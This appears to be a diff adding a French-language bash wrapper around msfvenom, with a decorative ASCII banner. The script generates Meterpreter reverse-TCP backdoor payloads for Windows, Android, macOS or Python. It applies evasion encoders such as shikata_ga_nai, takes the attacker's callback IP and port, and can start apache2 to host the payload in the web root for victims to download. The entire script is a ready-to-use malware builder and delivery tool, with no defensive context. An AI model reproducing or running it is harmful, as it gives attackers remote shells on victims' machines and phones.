@@ -1,0 +1,175 @@
+#!/bin/bash
+echo -e "\033[1;36m                                                                                                
+                                     kc                                                         
+                                     :Wd                                                        
+                                      dM0.                                                      
+                                      .0M0.                                                     
+                                       .XM0.                                                    
+                                        .XMO.                                                   
+                                         :MMK.                       ,c                         
+                                          oWMN:                    c0Nl                         
+                                           cWMW:                 ;KMK'                          
+                                            cWMX.              .kMWd                            
+                                .:ok0KKK0ko:.lMM0.            :XMWl                             
+                              ;OWMMMMMMMMMMMWNMMMX'         .0MMNc                              
+                             dMMMMMMMMMMMMMMMMMMMMN.        OMMk.                      ..,;,    
+                            .WMMMMMMMMMMMMMMMMMMMMMO      .0MMM'                .'cok0NWWKx;    
+                            ;MMMMMMMMMMMMMMMMMMMMMMMc     OMMMX.         .':ok0XWMN0ko:'.       
+                            'WMMMMMMMMMMMMMMMMMMMMMMX.   :MMMMc        .xWMMMN0xc'              
+                             kMMMMMMMMMMMMMMMMMMMMMMMK. .KMMMd       .dWMMx'.                   
+                             .kWMMMMMMMMMMMMMMMMMMMMMMklKMMMx       ;XMMMK.                     
+  .dKNXXK0Okxdolc;;,'..        'kWMMMMMMMMMMMMMMMMMMMMMMMMMO    'lkKWMMMk                       
+     ..,:codxO0KNWMMMMMWNK0xl;,...ckXWMMMMMMMMMMMMMMMMMMMMMMKxkNMMMMMXx:.;cooc.                 
+                 ..,cldkO0KKNMMMWN0xoll:cdOXWMMMMMMMMMMMMMMMMMMWX0kdcckXMMMMNWWk;               
+                             ;d0WMMMMMMXOkxxONMMMMMMMMMMMMMMMMMWNWMMMMMMMXx, 'OWMXdl:,..        
+                                .,lxKNMMMMMMWNWMMMMMMMMMMMMMMMMXodxkkkdl'      .;lx0KNWWX0ko:   
+                                      ..',;okXMMMMMMMMMMMMMMMMMx                      ..',;::   
+                                   .,coddkNMMMMKxkMMMMMMMMMMWxc.                                
+                                .l0WMMMMMMMWOc. .0MMWKMMWO00c                                   
+                              ,xWMMK:'clol,.   .XMMN,.NMMx                                      
+                            ;0MMNx;           .0MMMo  kMMMo                                     
+                          cXMWOc.             OMMMK.  dMMMX.                                    
+                       .lXMKo.              .xMMMN,   0MMMd                                     
+                      cXW0;               ;xWMMMN,    kMMO                                      
+                    :XNd.                lMMNOkl.     dMMO                                      
+                   .x:                  'NMMo         cMMW'                                     
+                                        0MMK.         .NMMc                                     
+                                       oMMK.           oMMl                                     
+                                      'WM0.            .NMd                                     
+                                      OMN.              kMO                                     
+                                     :MMc               cMX.                                    
+                                    .XMd                .NW'                                    
+                                    xMO                  OM;                                    
+                                   'WX.                  ;K'                                    
+                                   'o.                                                          
+                                          \033[0m"
+error="\033[1;31m [!]Erreur fatale\033[0m"
+AP=""
+if [ -e /bin/msfvenom ];then
+	echo -e "\033[1;32m [✔]MsfVenom validé \033[0m"
+else
+	echo -e "\033[1;31m [x]MsfVenom introuvable \033[0m"
+		echo -e "\033[1;31m [*]Veuillez Installer\033[1;33m msfvenom \033[0m"
+exit
+fi
+echo -e "\033[1;33m [1]windows/meterpreter/reverse_tcp \033[0m"
+echo -e "\033[1;33m [2]android/meterpreter/reverse_tcp \033[0m"
+echo -e "\033[1;33m [3]osx/x64/meterpreter_reverse_tcp \033[0m"
+echo -e "\033[1;33m [4]python/meterpreter_reverse_tcp \033[0m"
+echo -e -n "\033[1;36m [*]Séléctioner le Payload: \033[0m";
+read;
+if [ ${REPLY} = "1" ];then
+echo -e "\033[1;32m [✔]]Payload ${REPLY} Séléctioner \033[0m"
+	P=windows/meterpreter/reverse_tcp
+		PL=windows
+			A=x86
+				Q=here
+elif [ ${REPLY} = "2" ];then
+echo -e "\033[1;32m [✔]]Payload ${REPLY} Séléctioner \033[0m"
+	P=android/meterpreter/reverse_tcp
+		Q=none
+			Z="R>"
+			echo -e "\033[1;35m [i]Séléctioner 0 pour android \033[0m"
+elif [ ${REPLY} = "3" ];then
+echo -e "\033[1;32m [✔]]Payload ${REPLY} Séléctioner \033[0m"
+	P=osx/x64/meterpreter_reverse_tcp
+		PL=osx
+			A=x86
+				Q=here
+elif [ ${REPLY} = "4" ];then
+echo -e "\033[1;32m [✔]Payload ${REPLY} Séléctioner \033[0m"
+	P=python/meterpreter_reverse_tcp
+		PL=python
+			A=python
+				Q=here
+else
+	echo -e "\033[1;31m [!]Erreur Nombre invalide \033[0m"
+exit
+fi
+echo -e "\033[1;33m [0]Android [Empty]\033[0m"
+echo -e "\033[1;33m [1]x86/shikata_ga_nai [Excellent]\033[0m"
+echo -e "\033[1;33m [2]cmd/powershell_base64 [Excellent]\033[0m"
+echo -e "\033[1;33m [3]cmd/echo [Good] \033[0m"
+echo -e "\033[1;33m [4]x86/countdown [Normal] \033[0m"
+echo -e -n "\033[1;36m [*]Séléctioner l'encoder: \033[0m";
+read;
+if [ ${REPLY} = "0" ];then
+echo -e "\033[1;32m [✔]No Encoder Séléctioner \033[0m"
+elif [ ${REPLY} = "1" ];then
+echo -e "\033[1;32m [✔]Encoder ${REPLY} Séléctioner \033[0m"
+	E=x86/shikata_ga_nai
+elif [ ${REPLY} = "2" ];then
+echo -e "\033[1;32m [✔]Encoder ${REPLY} Séléctioner \033[0m"
+	E=cmd/powershell_base64
+elif [ ${REPLY} = "3" ];then
+echo -e "\033[1;32m [✔]Encoder ${REPLY} Séléctioner \033[0m"
+	E=cmd/echo
+elif [ ${REPLY} = "4" ];then
+echo -e "\033[1;32m [✔]Encoder ${REPLY} Séléctioner \033[0m"
+	E=x86/countdown
+else
+	echo -e "\033[1;31m [!]Erreur:Nombre invalide \033[0m"
+exit
+fi
+echo -e -n "\033[1;36m [*]Adresse IP: \033[0m";
+read;
+IP=${REPLY}
+echo -e "\033[1;32m [✔]Ip: $IP séléctioner \033[0m"
+echo -e -n "\033[1;36m [*]Port a utilisé: \033[0m";
+read;
+PORT=${REPLY}
+echo -e "\033[1;32m [✔]Port: $PORT séléctioner \033[0m"
+echo -e "\033[1;33m [0]Exe\033[0m"
+echo -e "\033[1;33m [1]dll\033[0m"
+echo -e "\033[1;33m [2]apk\033[0m"
+echo -e "\033[1;33m [3]osx-app\033[0m"
+echo -e "\033[1;33m [4]python\033[0m"
+echo -e -n "\033[1;36m [*]Séléctioner le fromat: \033[0m";
+read;
+if [ ${REPLY} = "0" ];then
+echo -e "\033[1;32m [✔]Format ${REPLY} Séléctioner\033[0m"
+	F=exe
+elif [ ${REPLY} = "1" ];then
+echo -e "\033[1;32m [✔]Encoder ${REPLY} Séléctioner \033[0m"
+	F=dll
+elif [ ${REPLY} = "2" ];then
+echo -e "\033[1;32m [✔]Encoder ${REPLY} Séléctioner \033[0m"
+	F=apk
+elif [ ${REPLY} = "3" ];then
+echo -e "\033[1;32m [✔]Encoder ${REPLY} Séléctioner \033[0m"
+	F=osx-app
+elif [ ${REPLY} = "4" ];then
+echo -e "\033[1;32m [✔]Encoder ${REPLY} Séléctioner \033[0m"
+	F=python
+else
+	echo -e "\033[1;31m [!]Erreur:Nombre invalide \033[0m"
+exit
+fi
+echo -e -n "\033[1;36m [?]Voulez vous placer le Payload sure le service apache2 [Oui:non] ?: \033[0m";
+read;
+if [ ${REPLY} = "oui" ];then
+	service apache2 start
+		echo -e "\033[1;32m [✔]Service apache2 lancez \033[0m"
+			AP="/var/www/html/"
+elif [ ${REPLY} = "o" ];then
+	service apache2 start
+		echo -e "\033[1;32m [✔]Service apache2 lancez \033[0m"
+			AP="/var/www/html/"
+elif [ ${REPLY} = "non" ];then
+	echo -e "\033[1;32m [i]Sauvegard dans /root/ \033[0m"
+elif [ ${REPLY} = "n" ];then
+	echo -e "\033[1;32m [i]Sauvegard a l'emplacement du script \033[0m"
+fi
+echo -e -n "\033[1;36m [*]Nom de donner au payload: \033[0m";
+read;
+NAME=${REPLY}
+	echo -e "\033[1;32m [✔]Payload nomé $NAME séléctioner \033[0m"
+		echo -e "\033[1;33m [1]Payload pour android \033[0m"
+			echo -e "\033[1;33m [2]Payload pour un autre OS \033[0m"
+				echo -e -n "\033[1;36m [*]Séléctioner un des choix: \033[0m";
+read;
+if [ ${REPLY} = 1 ];then
+msfvenom -p $P LHOST=$IP LPORT=$PORT $Z $AP -o $AP$NAME.$F
+elif [ ${REPLY} = 2 ];then
+msfvenom -p $P -e $E --platform $PL -a $A LHOST=$IP LPORT=$PORT -f $F -o $AP$NAME.$F
+fi
